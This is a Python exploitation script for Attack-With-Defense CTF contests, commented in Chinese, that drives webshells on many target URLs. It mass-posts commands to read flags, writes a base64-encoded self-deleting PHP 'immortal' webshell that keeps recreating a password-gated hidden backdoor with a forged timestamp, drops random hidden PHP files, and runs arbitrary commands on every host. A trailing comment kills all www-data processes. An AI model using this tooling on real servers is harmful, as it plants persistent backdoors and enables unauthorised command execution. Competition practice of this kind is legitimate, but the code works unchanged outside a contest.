import requests
import re
import random


def execute_cmd(key, cmd, url):
    """
    发送POST请求以执行命令
    :param key: 请求的键
    :param cmd: 要执行的命令
    :param url: 请求的URL
    :return: 如果请求成功返回1，否则返回0
    """
    data = {key: cmd}
    response = requests.post(url=url, data=data)
    #print(url)
    print(response.text)

    if response.status_code == 200:
        return 1
    return 0


def search_flag(content):
    """
    搜索字符串中包含 'flag{*}' 形式的字符串
    :param content: 要搜索的内容
    :return: 如果找到匹配的字符串，返回匹配项；否则返回0
    """
    pattern = re.compile(r'flag\{[^{}]*\}')
    target = re.search(pattern, content)
    return target.group() if target else 0


def can_execute_command(key, url):
    """
    检查是否可以执行命令
    :param key: 请求的键
    :param url: 请求的URL
    :return: 如果可以执行命令返回1，否则返回0
    """
    data = {key: "system('echo \"success\";');"}
    response = requests.post(url=url, data=data)
    return 1 if 'success' in response.text else 0


def get_flag(key, param, file_url):
    """
    从多个URL中获取flag
    :param key: 请求的键
    :param param: 要执行的命令
    :param file_url: 文件路径
    """
    with open('urls.txt', 'r') as file:
        for line in file:
            pre_url = line.strip()
            url = pre_url + file_url
            data = {key: param}

            try:

                response = requests.post(url=url, data=data, timeout=1)
                response.raise_for_status()
                target = search_flag(response.text)
                if target:
                    with open('flag.txt', 'a') as flag_file:
                        flag_file.write(f"{pre_url}"+'   '+f"flag: {target}\n")
                    print(f"地址: {url}"+'   '+f"flag: {target}")
                else:
                    print("flag不在这，请调整获取flag指令")
            except Exception as e:
                print(f"访问地址: {url} post传参 {key}={param}")
                continue


def get_shell(key, dir,filename):
    """
    获取shell并写入不死马
    :param key: 请求的键
    :param file_url: 文件路径
    """
    with open('urls.txt', 'r') as file:
        for line in file:
            pre_url = line.strip()
            if can_execute_command(key, pre_url + dir+filename):
                print('可执行whoami') #默认前置马为sh1.php 不死马密码为get传参 cmd=woshiruomima post传参cmd执行命令
                shell = '''system("echo 'PD9waHAKaWdub3JlX3VzZXJfYWJvcnQodHJ1ZSk7CnNldF90aW1lX2xpbWl0KDApOwp1bmxpbmsoX19GSUxFX18pOwokZmlsZSA9ICcuY29uZjFnLnBocCc7CiRjb2RlID0gJzw/cGhwIGlmKG1kNSgkX0dFVFsiY21kIl0pPT0iMGQxYjI0NzE3OGYyNGEzZDQwMTFiYjYxZjAyNDIxOTMiKXtAZXZhbCgkX1BPU1RbY21kXSk7fSBlY2hvICJUaGlzIGlzIGJ5IExpY2hhcnNlIjs/Pic7CndoaWxlICgxKXsKICAgIGZpbGVfcHV0X2NvbnRlbnRzKCRmaWxlLCRjb2RlKTsKICAgIHN5c3RlbSgndG91Y2ggLW0gLWQgIjIwMjEtMTItMDEgMDk6MTA6MTIiIC5jb25mMWcucGhwJyk7CiAgICB1c2xlZXAoMTAwMCk7Cn0=' | base64 -d > sh1.php");'''
                data = {key: shell}
                url = pre_url + dir+filename
                print(f"通过 {url} 进行传参 {key}")
                try:
                    qianzhima_url = pre_url + dir+'/sh1.php'
                    print(f"尝试写入前置马 {qianzhima_url}")
                    response = requests.post(url=url, data=data, timeout=1)
                    try:
                        target = requests.get(qianzhima_url,timeout=1)
                    except Exception as e:
                        pass

                    if can_execute_command('cmd',pre_url+dir+'/.conf1g.php?cmd=woshiruomima'):
                        with open('不死马ip.txt', 'a') as flag_file:
                            flag_file.write(f"{pre_url}{dir}/.cong1g.php\n")
                        print(f"地址: {pre_url}{dir}/.config.php 不死马生成")
                    else:
                        print("写入失败")
                except Exception as e:
                    if can_execute_command('cmd', pre_url + dir+'/.conf1g.php?cmd=woshiruomima'):
                        with open('不死马ip.txt', 'a') as flag_file:
                            flag_file.write(f"{pre_url}{dir}/.cong1g.php\n")
                        print(f"地址: {url} 前置马写入")
                    else:
                        print("写入失败")
                        continue
            else:
                print('无法执行，请手动自查传参是否有效')


def random_file(key, dir,filename):
    """
    随机生成文件
    :param key: 请求的键
    :param file_url: 文件路径
    """
    # 打开文件，处理文件读取异常
    try:
        with open('urls.txt', 'r') as file:
            for line in file:
                pre_url = line.strip()
                for i in range(3):  # 生成1000个随机文件
                    file_name = f".{random.random()}.php"
                    muma = '<?php system(\'cat flag\'); ?>'  # 修正PHP代码
                    data = {key: f'file_put_contents("{file_name}", "{muma}");'}
                    print(data)
                    response = requests.post(url=pre_url + dir+'/'+filename, data=data)
                    if response.status_code == 200:
                        print(f"POST请求成功: {response.text}")
                    else:
                        print(f"POST请求失败: {response.status_code}")

                    # 检查生成的文件是否存在
                    response = requests.get(pre_url +dir+'/'+file_name)
                    if response.status_code == 200:
                        print(f"文件 {file_name} 写入成功")
                    else:
                        print(f"文件 {file_name} 写入失败: {response.status_code}")
    except Exception as e:
        print(f"文件读取或请求过程中发生错误: {e}")



def main():
    print('''==============================================================================
                    AWD竞赛利用一体化脚本            Author:Licharse
==============================================================================
        '''
          )
    key = input("输入传参变量: ")
    param = input("输入执行指令: ")
    dir = input("目录(默认为根目录):")
    file_name=input("文件名:")
    file_url = dir+'/'+file_name
    #key, param, dir,file_name = 'cmd', 'system("cat ../flag");', '/upload','/1.php' #如果为根目录dir置空

    while True:
        print('1:批量获取flag')
        print('2:批量写入不死马')
        print('3:随机文件名生成')
        print('4:执行命令')
        print('5:退出')
        step=input("请输入使用:")
        if step=='1':
            get_flag(key, param,file_url)
        if step=='2':
            get_shell(key,dir,'/'+file_name)
        if step=='3':
            random_file(key,dir,file_name)
        if step=='4':
            param=input("输入使用命令:")
            with open('urls.txt', 'r') as file:
                for line in file:
                    pre_url = line.strip()
                    print(pre_url+dir+'/'+file_name)
                    execute_cmd(key, param, pre_url+dir+'/'+file_name)
        if step=='5':
            exit()



if __name__ == "__main__":
    main()
    # key, param, dir,file_name = 'cmd', 'system("cat flag");', '','/1.php'
    #file_url = dir+'/'+file_name
    #get_flag(key, param,file_url)
    #get_shell(key,dir,'/'+file_name)
    # random_file(key,dir,file_name)


#一键杀死进程马  ps aux | grep www-data | awk '{print $2}' |xargs kill -9
